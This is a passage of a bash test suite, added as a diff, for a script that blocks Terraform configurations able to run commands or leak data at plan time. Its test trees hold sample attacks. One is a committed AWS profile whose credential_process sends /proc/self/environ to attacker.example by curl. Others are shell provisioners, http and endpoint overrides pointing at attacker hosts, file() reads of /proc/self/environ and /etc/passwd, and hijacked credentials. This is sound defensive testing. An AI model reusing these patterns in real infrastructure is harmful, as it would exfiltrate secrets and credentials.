@@ -1,0 +1,890 @@
+#!/usr/bin/env bash
+# Tests for scripts/check-plan-time-exec.py against temp trees (attack corpus).
+#   bash scripts/tests/test-check-plan-time-exec.sh   (make test-scripts)
+# Needs python-hcl2 (.github/requirements/hcl2.txt). The checker reads its
+# allowlists from policies/opa/ of THIS repo, so these cases also prove that
+# the .rego parsing works.
+set -euo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
+SCRIPT="${REPO_ROOT}/scripts/check-plan-time-exec.py"
+workdir="$(mktemp -d)"
+trap 'rm -rf "${workdir}"' EXIT
+
+failures=0
+ok() { printf '  ok   %s\n' "$1"; }
+bad() { failures=$((failures + 1)); printf '  FAIL %s\n' "$1" >&2; }
+
+# add_file <tree> <relative file> <content>
+add_file() {
+  mkdir -p "$1/$(dirname "$2")"
+  printf '%s\n' "$3" >"$1/$2"
+}
+
+# case_tree <name> <relative file> <content>: one file in an otherwise empty tree.
+case_tree() {
+  local t="${workdir}/$1"
+  add_file "${t}" "$2" "$3"
+  echo "${t}"
+}
+
+# expect_rc <label> <rc> <tree> [<text the output must contain>]
+expect_rc() {
+  local rc=0
+  PLAN_EXEC_TEST=1 PLAN_EXEC_ROOT="$3" python3 -P "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
+  if [ "${rc}" -ne "$2" ]; then
+    bad "$1 (rc=${rc}, want $2)"
+    cat "${workdir}/out" >&2
+  elif [ -n "${4:-}" ] && ! grep -qF -- "$4" "${workdir}/out"; then
+    bad "$1 (output lacks: $4)"
+    cat "${workdir}/out" >&2
+  else
+    ok "$1"
+  fi
+}
+
+PROV='resource "terraform_data" "x" {
+  provisioner "local-exec" {
+    command = "id"
+  }
+}'
+
+# --- provisioners -----------------------------------------------------------
+expect_rc "clean module passes" 0 "$(case_tree clean modules/a/main.tf 'resource "aws_s3_bucket" "b" {
+  bucket = "x"
+}')"
+expect_rc "bare-label provisioner fails" 1 "$(case_tree bare modules/a/main.tf 'resource terraform_data x {
+  provisioner local-exec {
+    command = "curl https://attacker.example"
+  }
+}')" "provisioner"
+expect_rc "quoted provisioner fails" 1 "$(case_tree quoted envs/r/main.tf "${PROV}")" "provisioner"
+expect_rc "removed-block destroy provisioner fails" 1 "$(case_tree removed envs/r/main.tf 'removed {
+  from = terraform_data.z
+  provisioner "local-exec" {
+    when    = destroy
+    command = "id"
+  }
+}')" "removed block"
+expect_rc "removed-block provisioner fails even in vault-secrets" 1 "$(case_tree removedvs modules/supabase/vault-secrets/main.tf 'removed {
+  from = terraform_data.z
+  provisioner "local-exec" {
+    when    = destroy
+    command = "id"
+  }
+}')" "removed block"
+expect_rc "tf.json provisioner fails" 1 "$(case_tree json modules/a/main.tf.json '{"//": "comment", "resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}}')" "provisioner"
+expect_rc "allowlisted vault-secrets module keeps its provisioner" 0 "$(case_tree allow modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
+  provisioner "local-exec" {
+    command = "npm ci"
+  }
+}')"
+expect_rc "look-alike path is not allowlisted" 1 "$(case_tree look modules/evil/supabase/vault-secrets/main.tf "${PROV}")" "provisioner"
+expect_rc "e2e fixture keeps its settle provisioner" 0 "$(case_tree e2eok tests/e2e/aws/main.tf 'resource "terraform_data" "archive_settle" {
+  provisioner "local-exec" {
+    command = "sleep 20"
+  }
+}')"
+expect_rc "e2e fixture: another resource's provisioner fails" 1 "$(case_tree e2ebad tests/e2e/aws/main.tf "${PROV}")" "provisioner"
+expect_rc "a file outside the usual folders is scanned" 1 "$(case_tree outside evil/main.tf "${PROV}")" "evil/main.tf"
+expect_rc ".terraform is skipped" 0 "$(case_tree dotterraform modules/a/.terraform/modules/m/main.tf "${PROV}")"
+
+# --- external / http data and remote state -------------------------------------
+expect_rc "bare-label external data fails" 1 "$(case_tree ext modules/a/main.tf 'data external x {
+  program = ["sh", "-c", "env"]
+}')" 'data "external"'
+expect_rc "tf.json external data fails" 1 "$(case_tree jsondata modules/a/x.tf.json '{"data": {"external": {"x": {"program": ["sh", "-c", "env"]}}}}')" 'data "external"'
+expect_rc "check-scoped http data fails" 1 "$(case_tree check modules/a/main.tf 'check "c" {
+  data "http" "y" {
+    url = "https://attacker.example"
+  }
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}')" 'data "http"'
+expect_rc "remote state with an http backend fails" 1 "$(case_tree rshttp envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "http"
+  config = {
+    address = "https://attacker.example"
+  }
+}')" "terraform_remote_state"
+expect_rc "remote state backend from a variable fails" 1 "$(case_tree rsvar envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = var.backend
+}')" "terraform_remote_state"
+expect_rc "remote state with the cloud backend passes" 0 "$(case_tree rsok envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "cloud"
+  config = {
+    organization = "o"
+  }
+}')"
+
+# --- providers ----------------------------------------------------------------
+expect_rc "registry-qualified external provider fails" 1 "$(case_tree fq modules/a/versions.tf 'terraform {
+  required_providers {
+    e = { source = "registry.terraform.io/hashicorp/external" }
+  }
+}')" "hashicorp/external"
+expect_rc "mixed-case qualified source fails" 1 "$(case_tree mixed modules/a/versions.tf 'terraform {
+  required_providers {
+    e = { source = "Registry.Terraform.IO/HashiCorp/External" }
+  }
+}')" "hashicorp/external"
+expect_rc "third-party provider fails" 1 "$(case_tree third modules/a/versions.tf 'terraform {
+  required_providers {
+    x = { source = "attacker/exfil" }
+  }
+}')" "attacker/exfil"
+expect_rc "local name aws mapped to a third-party source fails" 1 "$(case_tree remap modules/a/versions.tf 'terraform {
+  required_providers {
+    aws = { source = "attacker/aws" }
+  }
+}')" "attacker/aws"
+expect_rc "version-only implied provider fails" 1 "$(case_tree implied modules/a/versions.tf 'terraform {
+  required_providers {
+    http = "~> 3.0"
+  }
+}')" "hashicorp/http"
+expect_rc "allowed qualified provider passes" 0 "$(case_tree okfq modules/a/versions.tf 'terraform {
+  required_providers {
+    aws = { source = "registry.terraform.io/hashicorp/aws", version = ">= 6.46.0, < 7.0.0" }
+  }
+}')"
+expect_rc "unlisted resource type prefix fails" 1 "$(case_tree prefix modules/a/main.tf 'resource "dns_a_record_set" "x" {
+  name = "x"
+}')" "hashicorp/dns"
+expect_rc "provider block of an undeclared provider fails" 1 "$(case_tree provblock envs/r/providers.tf 'provider "dns" {}')" "hashicorp/dns"
+expect_rc "action block of an unlisted provider fails" 1 "$(case_tree action modules/a/main.tf 'action "local_command" "x" {
+  config {
+    command = "id"
+  }
+}')" "hashicorp/local"
+
+# --- endpoint, proxy and TLS overrides ------------------------------------------
+expect_rc "aws endpoints override fails" 1 "$(case_tree endpoints envs/r/providers.tf 'provider "aws" {
+  endpoints {
+    sts = "https://attacker.example"
+  }
+}')" '"endpoints"'
+expect_rc "dynamic endpoints block fails" 1 "$(case_tree dynendpoints envs/r/providers.tf 'provider "aws" {
+  dynamic "endpoints" {
+    for_each = [1]
+    content {
+      sts = "https://attacker.example"
+    }
+  }
+}')" '"endpoints"'
+expect_rc "google custom endpoint fails" 1 "$(case_tree gce envs/r/providers.tf 'provider "google" {
+  secret_manager_custom_endpoint = "https://attacker.example/"
+}')" "secret_manager_custom_endpoint"
+expect_rc "tfe hostname fails" 1 "$(case_tree tfeh envs/r/providers.tf 'provider "tfe" {
+  hostname = "attacker.example"
+}')" '"hostname"'
+expect_rc "tf.json provider proxy fails" 1 "$(case_tree jsonprov envs/r/providers.tf.json '{"provider": {"aws": [{"region": "eu-west-2"}, {"alias": "b", "https_proxy": "http://attacker.example"}]}}')" "https_proxy"
+expect_rc "fips switch passes" 0 "$(case_tree fips envs/r/providers.tf 'provider "aws" {
+  use_fips_endpoint = true
+}')"
+
+# --- module sources -------------------------------------------------------------
+expect_rc "git module source fails" 1 "$(case_tree gitmod envs/r/main.tf 'module "m" {
+  source = "git::https://attacker.example/x.git//supabase/vault-secrets"
+}')" "git::https://attacker.example"
+expect_rc "registry module source fails" 1 "$(case_tree regmod envs/r/main.tf 'module "m" {
+  source  = "terraform-aws-modules/vpc/aws"
+  version = "6.0.0"
+}')" "terraform-aws-modules/vpc/aws"
+expect_rc "own release module passes" 0 "$(case_tree ownmod examples/r/main.tf 'module "m" {
+  source = "git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0"
+}')"
+
+# --- the OPA provisioner chain must exist in the code --------------------------
+t="${workdir}/chainok"
+add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
+  source = "../../modules/saas/stages/saas-workload"
+}'
+add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault_secrets" {
+  source = "../../../supabase/vault-secrets"
+}'
+add_file "${t}" modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
+  provisioner "local-exec" {
+    command = "npm ci"
+  }
+}'
+expect_rc "the OPA provisioner chain matches the code" 0 "${t}"
+t="${workdir}/chaindrift"
+add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
+  source = "../../modules/saas/stages/saas-workload"
+}'
+add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault" {
+  source = "../../../supabase/vault-secrets"
+}'
+expect_rc "a renamed call in the provisioner chain fails" 1 "${t}" "allowed_provisioner_chain"
+
+# --- parse failures fail closed (no fallback parse) ------------------------------
+# python-hcl2 7.3.1 rejects a line that starts with ? or : inside parentheses.
+# There is no retry: a retry that joined such lines let a heredoc closing line
+# swallow the blocks after it.
+expect_rc "leading-operator conditional fails closed" 1 "$(case_tree leadop envs/r/main.tf 'locals {
+  x = (
+    var.a
+    ? "b"
+    : "c"
+  )
+}')" "cannot parse"
+expect_rc "heredoc with a leading-operator line cannot hide a provisioner" 1 "$(case_tree heredoc envs/r/main.tf 'locals {
+  x = (
+    var.a
+    ? <<EOT
+text
+EOT
+    : "c"
+  )
+}
+resource "terraform_data" "x" {
+  provisioner "local-exec" {
+    command = "id"
+  }
+}')"
+expect_rc "heredoc body line that starts with : is not joined" 1 "$(case_tree heredoc2 envs/r/main.tf 'locals {
+  s = <<EOT
+a
+EOT
+}
+resource "terraform_data" "x" {
+  provisioner "local-exec" {
+    command = <<CMD
+: start
+CMD
+  }
+}')" "provisioner"
+expect_rc "duplicate tf.json key cannot hide a provisioner" 1 "$(case_tree jsondup modules/a/main.tf.json '{"resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}, "resource": {"aws_s3_bucket": {"b": {"bucket": "x"}}}}')" "duplicate JSON key"
+expect_rc "duplicate nested tf.json key fails closed" 1 "$(case_tree jsondup2 envs/r/p.tf.json '{"provider": {"aws": {"region": "eu-west-2", "region": "us-east-1"}}}')" "duplicate JSON key"
+
+# --- tracked files (git mode) ----------------------------------------------------
+# git_tree <name>: a git work tree with every file staged (ls-files reads the index).
+git_tree() {
+  git -C "$1" init -q
+  git -C "$1" add -A
+}
+t="${workdir}/gitok"
+add_file "${t}" modules/a/main.tf 'resource "aws_s3_bucket" "b" {
+  bucket = "x"
+}'
+add_file "${t}" untracked-later.txt 'x'
+git_tree "${t}"
+add_file "${t}" evil/main.tf "${PROV}"
+expect_rc "git mode passes a clean tree and skips untracked files" 0 "${t}"
+t="${workdir}/gitsymlink"
+add_file "${t}" elsewhere/main.tf "${PROV}"
+mkdir -p "${t}/modules"
+ln -s ../elsewhere "${t}/modules/link"
+git_tree "${t}"
+git -C "${t}" rm -q --cached elsewhere/main.tf
+expect_rc "a tracked symlink fails" 1 "${t}" "tracked symlink"
+t="${workdir}/gitnodemodules"
+add_file "${t}" modules/a/node_modules/x/main.tf "${PROV}"
+git_tree "${t}"
+git -C "${t}" add -f modules/a/node_modules/x/main.tf
+expect_rc "a tracked file under node_modules fails" 1 "${t}" "node_modules"
+t="${workdir}/gitdotterraform"
+add_file "${t}" envs/r/.terraform/modules/m/main.tf "${PROV}"
+git_tree "${t}"
+git -C "${t}" add -f envs/r/.terraform/modules/m/main.tf
+expect_rc "a tracked file under .terraform fails" 1 "${t}" ".terraform"
+expect_rc "a local module source into node_modules fails" 1 "$(case_tree modnm envs/r/main.tf 'module "m" {
+  source = "./node_modules/x"
+}')" "node_modules"
+expect_rc "a local module source into .terraform fails" 1 "$(case_tree moddt envs/r/main.tf 'module "m" {
+  source = "../../.terraform/modules/x"
+}')" ".terraform"
+
+# --- mutations the first suite did not catch -----------------------------------
+expect_rc "aws_lambda_invocation data fails" 1 "$(case_tree lambda modules/a/main.tf 'data "aws_lambda_invocation" "x" {
+  function_name = "f"
+  input         = "{}"
+}')" 'data "aws_lambda_invocation"'
+expect_rc "aws_lambda_invoke action fails" 1 "$(case_tree lambdaact modules/a/main.tf 'action "aws_lambda_invoke" "x" {
+  config {
+    function_name = "f"
+  }
+}')" "allowed_action_types"
+expect_rc "interpolated remote-state backend fails" 1 "$(case_tree rsinterp envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "${"cloud"}"
+}')" "terraform_remote_state"
+expect_rc "remote state with the remote backend passes" 0 "$(case_tree rsremote envs/r/main.tf 'data "terraform_remote_state" "x" {
+  backend = "remote"
+}')"
+expect_rc "a provisioner nested in another block is found" 1 "$(case_tree nested modules/a/main.tf 'resource "terraform_data" "x" {
+  dynamic "provisioner" {
+    for_each = [1]
+    content {}
+  }
+}')" "provisioner"
+expect_rc "a sub-folder of vault-secrets is not the reviewed module" 1 "$(case_tree vssub modules/supabase/vault-secrets/sub/main.tf "${PROV}")" "provisioner"
+expect_rc "an ephemeral block of an unlisted provider fails" 1 "$(case_tree eph modules/a/main.tf 'ephemeral "vault_kv_secret" "x" {
+  path = "x"
+}')" "hashicorp/vault"
+expect_rc "an allowlisted ephemeral type passes" 0 "$(case_tree ephok envs/r/main.tf 'ephemeral "tfe_outputs" "saas" {
+  organization = "o"
+  workspace    = "saas-x"
+}')"
+expect_rc "the provider argument decides the provider" 1 "$(case_tree provarg modules/a/main.tf 'resource "aws_s3_bucket" "b" {
+  provider = dns
+  bucket   = "x"
+}')" "hashicorp/dns"
+expect_rc "an aliased allowed provider argument passes" 0 "$(case_tree provalias modules/a/main.tf 'resource "aws_s3_bucket" "b" {
+  provider = aws.west
+  bucket   = "x"
+}')"
+t="${workdir}/scope"
+add_file "${t}" modules/a/versions.tf 'terraform {
+  required_providers {
+    dns = { source = "hashicorp/aws" }
+  }
+}'
+add_file "${t}" modules/b/main.tf 'resource "dns_a_record_set" "x" {
+  name = "x"
+}'
+expect_rc "required_providers apply to their own folder only" 1 "${t}" "modules/b/main.tf"
+expect_rc "a tf.json comment key is skipped" 0 "$(case_tree jsoncomment modules/a/versions.tf.json '{"terraform": {"required_providers": {"//": "pinned by Renovate", "aws": {"source": "hashicorp/aws"}}}}')"
+for src in \
+  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0&depth=1' \
+  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0-evil' \
+  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=main' \
+  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/../../x?ref=v0.1.0' \
+  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git-evil//modules/aws?ref=v0.1.0' \
+  '..evil/x' \
+  '.evil/x'; do
+  expect_rc "module source ${src} fails" 1 "$(case_tree "mod$(printf '%s' "${src}" | cksum | cut -d' ' -f1)" modules/r/main.tf "module \"m\" {
+  source = \"${src}\"
+}")" "neither local nor"
+done
+
+# --- SEC-1: credential, profile and identity arguments ----------------------------
+# The reviewer's bypass: a committed AWS config whose credential_process runs a
+# command when the provider is configured (plan and apply).
+t="${workdir}/sec1"
+add_file "${t}" envs/r/aws.cfg '[profile pwn]
+credential_process = sh -c "curl -d @/proc/self/environ https://attacker.example"'
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  profile             = "pwn"
+  shared_config_files = ["./aws.cfg"]
+}'
+expect_rc "SEC-1: profile with a committed shared config file fails" 1 "${t}" '"profile"'
+expect_rc "SEC-1: the shared config file is reported too" 1 "${t}" '"shared_config_files"'
+for key in shared_credentials_files access_key secret_key token web_identity_token_file; do
+  expect_rc "aws ${key} literal fails" 1 "$(case_tree "aws${key}" envs/r/providers.tf "provider \"aws\" {
+  ${key} = \"x\"
+}")" "\"${key}\""
+done
+expect_rc "aws assume_role_with_web_identity fails" 1 "$(case_tree awswi envs/r/providers.tf 'provider "aws" {
+  assume_role_with_web_identity {
+    role_arn                = "arn:aws:iam::111111111111:role/x"
+    web_identity_token_file = "./token"
+  }
+}')" "assume_role_with_web_identity"
+expect_rc "a dynamic credential block fails" 1 "$(case_tree awsdynwi envs/r/providers.tf 'provider "aws" {
+  dynamic "assume_role_with_web_identity" {
+    for_each = [1]
+    content {
+      web_identity_token_file = "./token"
+    }
+  }
+}')" "assume_role_with_web_identity"
+# The form envs/aws/security and envs/aws/backup use (copied from the root).
+DYN_VAR='variable "tfc_aws_dynamic_credentials" {
+  type = object({
+    default = object({ shared_config_file = string })
+    aliases = map(object({ shared_config_file = string }))
+  })
+  default = null
+}'
+t="${workdir}/dyncreds"
+add_file "${t}" envs/aws/security/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/aws/security/providers.tf 'provider "aws" {
+  region              = local.aws_region
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}
+provider "aws" {
+  alias               = "log_archive"
+  region              = local.aws_region
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.aliases["log_archive"].shared_config_file]
+  dynamic "assume_role" {
+    for_each = var.tfc_aws_dynamic_credentials == null ? [local.org.account_role_arns["log_archive"]] : []
+    content {
+      role_arn = assume_role.value
+    }
+  }
+}'
+expect_rc "the dynamic-credentials shared config form passes" 0 "${t}"
+t="${workdir}/dyncredsdefault"
+add_file "${t}" envs/r/variables.tf 'variable "tfc_aws_dynamic_credentials" {
+  type    = any
+  default = { default = { shared_config_file = "./aws.cfg" } }
+}'
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+expect_rc "a default on the dynamic-credentials variable fails" 1 "${t}" "default"
+t="${workdir}/dyncredsfile"
+add_file "${t}" envs/r/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? [abspath("aws.cfg")] : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+expect_rc "a file path beside the allowed reference fails" 1 "${t}" '"shared_config_files"'
+t="${workdir}/dyncredslit"
+add_file "${t}" envs/r/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? ["./aws.cfg"] : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+expect_rc "a literal path beside the allowed reference fails" 1 "${t}" '"shared_config_files"'
+t="${workdir}/dyncredscreds"
+add_file "${t}" envs/r/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_credentials_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+expect_rc "the allowed reference does not allow another argument" 1 "${t}" '"shared_credentials_files"'
+t="${workdir}/gcpimp"
+add_file "${t}" envs/gcp/workload/variables.tf 'variable "terraform_admin_email" {
+  type    = string
+  default = null
+}'
+add_file "${t}" envs/gcp/workload/providers.tf 'provider "google" {
+  impersonate_service_account = var.terraform_admin_email
+}
+provider "google-beta" {
+  impersonate_service_account = var.terraform_admin_email
+}'
+expect_rc "GCP impersonation of var.terraform_admin_email passes" 0 "${t}"
+expect_rc "GCP impersonation of a literal fails" 1 "$(case_tree gcpimplit envs/r/providers.tf 'provider "google" {
+  impersonate_service_account = "evil@attacker.iam.gserviceaccount.com"
+}')" "impersonate_service_account"
+t="${workdir}/gcpimpdefault"
+add_file "${t}" envs/r/variables.tf 'variable "terraform_admin_email" {
+  type    = string
+  default = "evil@attacker.iam.gserviceaccount.com"
+}'
+add_file "${t}" envs/r/providers.tf 'provider "google" {
+  impersonate_service_account = var.terraform_admin_email
+}'
+expect_rc "GCP impersonation through a variable default fails" 1 "${t}" "default"
+expect_rc "google access_token fails" 1 "$(case_tree gcpat envs/r/providers.tf 'provider "google" {
+  access_token = var.token
+}')" '"access_token"'
+expect_rc "google external_credentials fails" 1 "$(case_tree gcpext envs/r/providers.tf 'provider "google" {
+  external_credentials {
+    audience              = "//iam.googleapis.com/x"
+    service_account_email = "x@y.iam.gserviceaccount.com"
+    identity_token        = "t"
+  }
+}')" "external_credentials"
+# envs/saas and the workload roots (copied from the roots).
+SAAS_PROVIDERS='terraform {
+  required_providers {
+    supabase = { source = "supabase/supabase" }
+    vercel   = { source = "vercel/vercel" }
+  }
+}'
+t="${workdir}/saastokens"
+add_file "${t}" envs/s/providers.tf 'provider "supabase" {
+  access_token = local.enable_supabase ? null : "sbp_disabled_placeholder"
+}
+provider "vercel" {
+  api_token = local.enable_vercel ? null : "000000000000000000000000"
+}'
+add_file "${t}" envs/s/versions.tf "${SAAS_PROVIDERS}"
+add_file "${t}" envs/aws/workload/variables.tf 'variable "enable_saas_secret_bridge" {
+  type    = bool
+  default = false
+}'
+add_file "${t}" envs/aws/workload/providers.tf 'provider "tfe" {
+  token = var.enable_saas_secret_bridge ? null : "saas-bridge-disabled-placeholder"
+}'
+expect_rc "the placeholder token forms pass" 0 "${t}"
+expect_rc "a literal tfe token fails" 1 "$(case_tree tfetok envs/r/providers.tf 'provider "tfe" {
+  token = var.enable_saas_secret_bridge ? null : "attacker-token"
+}')" '"token"'
+t="${workdir}/vertok"
+add_file "${t}" envs/r/versions.tf "${SAAS_PROVIDERS}"
+add_file "${t}" envs/r/providers.tf 'provider "vercel" {
+  api_token = local.attacker_token
+}'
+expect_rc "a vercel token from another local fails" 1 "${t}" '"api_token"'
+expect_rc "a null credential argument passes" 0 "$(case_tree nullcred envs/r/providers.tf 'provider "google" {
+  access_token = null
+}')"
+
+# --- Review follow-up of SEC-1 ----------------------------------------------------
+t="${workdir}/saaslocal"
+add_file "${t}" envs/r/versions.tf "${SAAS_PROVIDERS}"
+add_file "${t}" envs/r/providers.tf 'locals {
+  supabase_disabled_placeholder_token = "sbp_attacker"
+}
+provider "supabase" {
+  access_token = local.enable_supabase ? null : local.supabase_disabled_placeholder_token
+}'
+expect_rc "I3: a placeholder token held in a local fails" 1 "${t}" "local.supabase_disabled_placeholder_token"
+# C1: a committed tfvars file sets the variable that an allowed form reads.
+t="${workdir}/c1tfvars"
+add_file "${t}" envs/r/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+add_file "${t}" envs/r/evil.auto.tfvars 'tfc_aws_dynamic_credentials = { default = { shared_config_file = "./evil.cfg" }, aliases = {} }'
+expect_rc "C1: a tfvars file that sets a credential variable fails" 1 "${t}" "evil.auto.tfvars"
+t="${workdir}/c1tfvarsjson"
+add_file "${t}" envs/r/x.tfvars.json '{"terraform_admin_email": "evil@attacker.iam.gserviceaccount.com"}'
+expect_rc "C1: a tfvars.json file that sets a credential variable fails" 1 "${t}" "x.tfvars.json"
+t="${workdir}/tfvarsok"
+add_file "${t}" envs/gcp/guardrails/guardrails.auto.tfvars 'deny_policies = {}'
+expect_rc "a tfvars file that sets other variables passes" 0 "${t}"
+expect_rc "an unparseable tfvars file fails closed" 1 "$(case_tree tfvarsbad envs/r/x.tfvars 'a = {')" "cannot parse"
+# C2: an optional attribute with a default inside the variable type.
+t="${workdir}/c2pin"
+add_file "${t}" envs/r/variables.tf 'variable "tfc_aws_dynamic_credentials" {
+  type = object({
+    default = object({ shared_config_file = string })
+    aliases = map(object({ shared_config_file = string }))
+    pin     = optional(object({ shared_config_file = string }), { shared_config_file = "./evil.cfg" })
+  })
+  default = null
+}'
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.pin.shared_config_file]
+}'
+expect_rc "C2: a reference path outside the exact forms fails" 1 "${t}" "var.tfc_aws_dynamic_credentials.pin.shared_config_file"
+expect_rc "C2: a variable type other than the canonical one fails" 1 "${t}" "type"
+t="${workdir}/c2default"
+add_file "${t}" envs/r/variables.tf 'variable "tfc_aws_dynamic_credentials" {
+  type = object({
+    default = optional(object({ shared_config_file = string }), { shared_config_file = "./evil.cfg" })
+    aliases = map(object({ shared_config_file = string }))
+  })
+  default = null
+}'
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = var.tfc_aws_dynamic_credentials == null ? null : [var.tfc_aws_dynamic_credentials.default.shared_config_file]
+}'
+expect_rc "C2: an optional default inside the allowed path fails" 1 "${t}" "type"
+t="${workdir}/m3email"
+add_file "${t}" envs/r/variables.tf 'variable "terraform_admin_email" {
+  type    = any
+  default = null
+}'
+add_file "${t}" envs/r/providers.tf 'provider "google" {
+  impersonate_service_account = var.terraform_admin_email
+}'
+expect_rc "M3: terraform_admin_email must be a string variable" 1 "${t}" "type"
+t="${workdir}/m3bridge"
+add_file "${t}" envs/r/variables.tf 'variable "enable_saas_secret_bridge" {
+  type    = string
+  default = null
+}'
+add_file "${t}" envs/r/providers.tf 'provider "tfe" {
+  token = var.enable_saas_secret_bridge
+}'
+expect_rc "M3: enable_saas_secret_bridge must be a bool variable" 1 "${t}" "type"
+t="${workdir}/m3undeclared"
+add_file "${t}" envs/r/providers.tf 'provider "google" {
+  impersonate_service_account = var.terraform_admin_email
+}'
+expect_rc "an allowed variable must be declared beside the provider" 1 "${t}" "terraform_admin_email"
+# M1: a bare list of one allowed interpolation, with a trailing comment.
+t="${workdir}/m1list"
+add_file "${t}" envs/r/variables.tf "${DYN_VAR}"
+add_file "${t}" envs/r/providers.tf 'provider "aws" {
+  shared_config_files = [var.tfc_aws_dynamic_credentials.default.shared_config_file] # dynamic credentials
+}'
+expect_rc "M1: a list of the allowed reference passes" 0 "${t}"
+# I1: override files merge into the root after the scanned files.
+expect_rc "I1: a tracked override file fails" 1 "$(case_tree ovr envs/r/a_override.tf 'variable "tfc_aws_dynamic_credentials" {
+  default = { default = { shared_config_file = "./evil.cfg" } }
+}')" "override"
+expect_rc "I1: override.tf.json fails" 1 "$(case_tree ovrjson envs/r/override.tf.json '{"locals": {"x": 1}}')" "override"
+expect_rc "I1: a fork backend_override.tf with only a cloud block passes" 0 "$(case_tree ovrbackend envs/r/backend_override.tf 'terraform {
+  cloud {
+    organization = "o"
+  }
+}')"
+expect_rc "I1: backend_override.tf with anything else fails" 1 "$(case_tree ovrbackendbad envs/r/backend_override.tf 'terraform {
+  backend "local" {}
+}
+locals {
+  x = 1
+}')" "may hold only"
+# I2: HCP runs envs/**; a tag-pinned module there is not scanned.
+expect_rc "I2: a release-tag module source in envs fails" 1 "$(case_tree envsgit envs/r/main.tf 'module "m" {
+  source = "git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0"
+}')" "envs/"
+# file() and friends read files on the runner; their output reaches state.
+expect_rc "an absolute file() path fails" 1 "$(case_tree procfile envs/r/main.tf 'locals {
+  env = file("/proc/self/environ")
+}')" "/proc/self/environ"
+expect_rc "a templatefile() path that leaves the repository fails" 1 "$(case_tree escfile modules/a/main.tf 'locals {
+  x = templatefile("${path.module}/../../../../../etc/passwd", {})
+}')" "templatefile"
+expect_rc "a file() path built by a function fails" 1 "$(case_tree joinfile modules/a/main.tf 'locals {
+  x = filebase64(join("", ["/proc", "/self/environ"]))
+}')" "filebase64"
+expect_rc "a path.module file() passes" 0 "$(case_tree okfile modules/a/main.tf 'locals {
+  x = file("${path.module}/policies/p.json")
+  s = fileset(path.module, "*.json")
+}')"
+# SEC-1: a reference or an interpolated segment can hold /proc/self/environ or ../.
+expect_rc "SEC-1: file(var.x) fails" 1 "$(case_tree varfile modules/a/main.tf 'locals {
+  x = file(var.path)
+}')" "file(var.path) reads a path from a reference"
+expect_rc "SEC-1: templatefile(local.x) fails" 1 "$(case_tree localfile envs/r/main.tf 'locals {
+  x = templatefile(local.tpl, {})
+}')" "templatefile(local.tpl)"
+expect_rc "SEC-1: an interpolated path segment fails" 1 "$(case_tree interpfile modules/a/main.tf 'locals {
+  y = [for n in var.names : yamldecode(file("${path.module}/presets/${n}.yaml"))]
+}')" "builds its path from an interpolation"
+# Re-audit 5 SEC-1: a reviewed reader is pinned to its whole expression, the
+# locals that bind its path and its variable's validations, not its call text.
+LOADER_LOCALS='locals {
+  landing_zone_config_file = var.landing_zone_config_path == "" ? null : (
+    var.landing_zone_config_path == null ? "${path.root}/../../../config/landing-zone.yaml" : (
+      startswith(var.landing_zone_config_path, "/") ? var.landing_zone_config_path : "${path.root}/${var.landing_zone_config_path}"
+    )
+  )
+  lz_documents = [
+    for f in compact([local.landing_zone_config_file != null && fileexists(coalesce(local.landing_zone_config_file, "/nonexistent")) ? local.landing_zone_config_file : ""]) :
+    yamldecode(file(f))
+  ]
+}'
+LOADER_VAR='variable "landing_zone_config_path" {
+  type    = string
+  default = null
+  validation {
+    condition = var.landing_zone_config_path == null || var.landing_zone_config_path == "" || (
